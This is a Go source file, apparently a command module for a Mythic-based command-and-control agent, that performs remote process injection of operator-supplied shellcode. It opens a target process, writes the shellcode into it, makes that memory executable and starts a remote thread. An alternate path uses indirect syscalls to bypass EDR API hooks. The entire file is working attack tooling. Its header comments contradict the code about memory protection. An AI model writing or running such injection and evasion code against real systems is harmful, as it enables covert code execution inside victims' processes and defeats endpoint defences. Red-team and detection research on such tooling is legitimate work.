//go:build windows
// +build windows

// Package commands provides the vanilla-injection command for remote process injection.
//
// This command performs classic remote process injection using the most common Windows APIs:
// - VirtualAllocEx: Allocates memory in the target process with PAGE_EXECUTE_READ permissions
// - WriteProcessMemory: Writes the shellcode into the allocated memory
// - CreateRemoteThread: Creates a thread in the target process to execute the shellcode
//
// Workflow:
//  1. Operator uploads shellcode to Mythic (can be done via the Files page)
//  2. Operator selects the shellcode file from Mythic's file storage in the command modal
//  3. Operator specifies the target process PID
//  4. Agent retrieves the shellcode from Mythic
//  5. Agent opens a handle to the target process with required permissions
//  6. Agent allocates RX memory in the target process
//  7. Agent writes the shellcode to the allocated memory
//  8. Agent creates a remote thread to execute the shellcode
//
// Security considerations:
//   - Requires appropriate privileges to inject into the target process
//   - Uses basic/vanilla technique that is well-signatured by EDR
//   - Allocates memory as PAGE_EXECUTE_READ (RX) to avoid VirtualProtectEx calls
//   - Best used in environments with minimal or no EDR monitoring
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

const (
	PROCESS_CREATE_THREAD     = 0x0002
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_READ           = 0x0010

	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

var (
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procOpenProcess        = kernel32.NewProc("OpenProcess")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
)

// VanillaInjectionCommand implements the vanilla-injection command
type VanillaInjectionCommand struct{}

// Name returns the command name
func (c *VanillaInjectionCommand) Name() string {
	return "vanilla-injection"
}

// Description returns the command description
func (c *VanillaInjectionCommand) Description() string {
	return "Perform vanilla remote process injection using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread"
}

// VanillaInjectionParams represents the parameters for vanilla-injection
type VanillaInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
	PID          int    `json:"pid"`           // Target process ID
}

// Execute executes the vanilla-injection command
func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse parameters
	var params VanillaInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode the base64-encoded shellcode
	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Build output
	output := fmt.Sprintf("[*] Received shellcode: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)

	// Use indirect syscalls if available (bypasses userland API hooks)
	if IndirectSyscallsAvailable() {
		return c.executeIndirect(params.PID, shellcode, output)
	}
	return c.executeStandard(params.PID, shellcode, output)
}

// executeStandard uses standard Win32 API calls (VirtualAllocEx, WriteProcessMemory, etc.)
func (c *VanillaInjectionCommand) executeStandard(pid int, shellcode []byte, output string) structs.CommandResult {
	output += "[*] Using standard Win32 API calls\n"

	// Step 1: Open handle to target process
	output += fmt.Sprintf("[*] Opening handle to process %d...\n", pid)

	desiredAccess := PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ

	hProcess, _, err := procOpenProcess.Call(
		uintptr(desiredAccess),
		uintptr(0),
		uintptr(pid),
	)

	if hProcess == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] Failed to open process: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseHandle.Call(hProcess)

	output += "[+] Successfully opened process handle\n"

	// Step 2: Allocate RW memory in remote process (W^X: write first, protect later)
	output += fmt.Sprintf("[*] Allocating %d bytes of RW memory in remote process...\n", len(shellcode))

	remoteAddr, _, err := procVirtualAllocEx.Call(
		hProcess,
		uintptr(0),
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_READWRITE),
	)

	if remoteAddr == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] VirtualAllocEx failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[+] Allocated memory at address: 0x%X\n", remoteAddr)

	// Step 3: Write shellcode to remote process memory
	output += "[*] Writing shellcode to remote process memory...\n"

	var bytesWritten uintptr
	ret, _, err := procWriteProcessMemory.Call(
		hProcess,
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] WriteProcessMemory failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)

	// Step 4: Change to RX (W^X enforcement — never allocate RWX)
	var oldProtect uint32
	ret, _, err = procVirtualProtectX.Call(
		hProcess, remoteAddr, uintptr(len(shellcode)),
		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] VirtualProtectEx failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	output += "[+] Changed memory protection to RX\n"

	// Step 5: Create remote thread to execute shellcode
	output += "[*] Creating remote thread...\n"

	hThread, _, err := procCreateRemoteThread.Call(
		hProcess,
		uintptr(0),
		uintptr(0),
		remoteAddr,
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)

	if hThread == 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] CreateRemoteThread failed: %v\n", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseHandle.Call(hThread)

	output += fmt.Sprintf("[+] Successfully created remote thread (handle: 0x%X)\n", hThread)
	output += "[+] Vanilla injection completed successfully\n"

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// executeIndirect uses indirect syscalls (Nt* via ntdll gadgets) to bypass API hooks.
// Uses W^X pattern: allocate RW → write → protect RX → execute thread
func (c *VanillaInjectionCommand) executeIndirect(pid int, shellcode []byte, output string) structs.CommandResult {
	output += "[*] Using indirect syscalls (calls originate from ntdll)\n"

	// Step 1: Open handle to target process via NtOpenProcess
	output += fmt.Sprintf("[*] Opening handle to process %d...\n", pid)

	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	var hProcess uintptr
	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(pid))
	if status != 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X\n", status),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseHandle.Call(hProcess)

	output += "[+] Successfully opened process handle\n"

	// Step 2: Allocate RW memory (W^X: write first, then change to RX)
	regionSize := uintptr(len(shellcode))
	var baseAddr uintptr
	output += fmt.Sprintf("[*] Allocating %d bytes of RW memory via NtAllocateVirtualMemory...\n", regionSize)

	status = IndirectNtAllocateVirtualMemory(hProcess, &baseAddr, &regionSize,
		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if status != 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] NtAllocateVirtualMemory failed: NTSTATUS 0x%X\n", status),
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[+] Allocated memory at address: 0x%X\n", baseAddr)

	// Step 3: Write shellcode via NtWriteVirtualMemory
	output += "[*] Writing shellcode via NtWriteVirtualMemory...\n"

	var bytesWritten uintptr
	status = IndirectNtWriteVirtualMemory(hProcess, baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
	if status != 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] NtWriteVirtualMemory failed: NTSTATUS 0x%X\n", status),
			Status:    "error",
			Completed: true,
		}
	}

	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)

	// Step 4: Change protection from RW to RX (W^X enforcement)
	output += "[*] Changing memory protection to RX via NtProtectVirtualMemory...\n"

	protectAddr := baseAddr
	protectSize := uintptr(len(shellcode))
	var oldProtect uint32
	status = IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
		PAGE_EXECUTE_READ, &oldProtect)
	if status != 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] NtProtectVirtualMemory failed: NTSTATUS 0x%X\n", status),
			Status:    "error",
			Completed: true,
		}
	}

	output += "[+] Memory protection changed to RX\n"

	// Step 5: Create remote thread via NtCreateThreadEx
	output += "[*] Creating remote thread via NtCreateThreadEx...\n"

	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, baseAddr)
	if status != 0 {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status),
			Status:    "error",
			Completed: true,
		}
	}
	defer procCloseHandle.Call(hThread)

	output += fmt.Sprintf("[+] Successfully created remote thread (handle: 0x%X)\n", hThread)
	output += "[+] Indirect syscall injection completed successfully\n"

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}
